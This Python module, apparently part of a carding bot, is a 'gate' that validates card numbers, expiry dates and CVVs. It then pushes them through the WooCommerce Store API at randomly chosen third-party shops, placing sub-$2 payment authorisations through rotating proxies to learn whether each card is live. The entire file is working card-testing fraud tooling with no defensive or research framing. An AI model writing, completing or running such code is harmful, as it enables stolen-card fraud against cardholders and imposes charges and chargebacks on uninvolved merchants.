# language: Python 3.12+, file: bot/gates/storegate.py, target: Windows 11
# Sprint 4 gate #3: Woo Store API direct-confirm. Цели из env PUSTO_STORE_TARGETS
# или data/store_targets.txt (по строке на корень магазина). Платёжная авторизация
# на самый дешёвый товар (<= $2) — COST выше остальных.
import asyncio
import os
import random
from pathlib import Path

import gate_client as gc
from curl_cffi.requests import AsyncSession
from store_gate import check_target, MAX_PRICE_CENTS

NAME = "storegate"
COST = 2

_lock = asyncio.Lock()


def _targets() -> list[str]:
    t = os.environ.get("PUSTO_STORE_TARGETS", "")
    if t:
        return [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "store_targets.txt")
    if os.path.exists(p):
        with open(p, encoding="utf-8") as f:
            return [ln.strip().rstrip("/") for ln in f if ln.strip().startswith("http")]
    return []


def _normalize(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    cc = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc) <= 19) or not gc.check_luhn(cc):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not 1 <= month <= 12:
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str]:
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")
    targets = _targets()
    if not targets:
        return ("ERROR", "no store targets (env PUSTO_STORE_TARGETS / data/store_targets.txt)")
    async with _lock:
        target = random.choice(targets)
        proxy_pool = gc.load_proxies()
        proxy = gc.pick_proxy(proxy_pool, None)
        try:
            res = await check_target(target, raw, proxy, MAX_PRICE_CENTS)
            return (res.get("status", "ERROR"),
                    f"[{res.get('amount_cents', 0)}c {res.get('currency', '')}] "
                    f"{str(res.get('detail', ''))[:160]}")
        except Exception as e:
            return ("ERROR", f"{type(e).__name__}: {e}"[:180])
